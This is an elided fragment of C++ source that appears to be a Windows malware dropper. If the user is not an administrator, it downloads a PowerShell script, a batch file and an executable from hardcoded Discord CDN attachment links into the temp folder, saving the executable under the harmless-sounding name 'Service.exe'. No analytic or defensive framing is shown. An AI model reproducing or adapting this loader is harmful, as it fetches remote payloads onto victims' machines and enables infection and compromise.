...
int main() {
    if (!IsUserAnAdmin()) {
        ...
        const wchar_t* ps1FileUrls[] = {
            L"https://cdn.discordapp.com/attachments/1168624116144820354/1181039366475366443/aaaa_1.ps1",
        ...
        const wchar_t* exeFileUrl = L"https://cdn.discordapp.com/attachments/1168624116144820354/1181035947580727346/adad.exe";
        ...
        std::wstring exeFileName = L"Service.exe";
        wchar_t batFilePath[MAX_PATH];
        wchar_t exeFilePath[MAX_PATH];
        swprintf_s(batFilePath, L"%s\\%s", tempPath, batFileName.c_str());
        swprintf_s(exeFilePath, L"%s\\%s", tempPath, exeFileName.c_str());
        DownloadFile(batFileUrl, batFilePath);
        DownloadFile(exeFileUrl, exeFilePath);
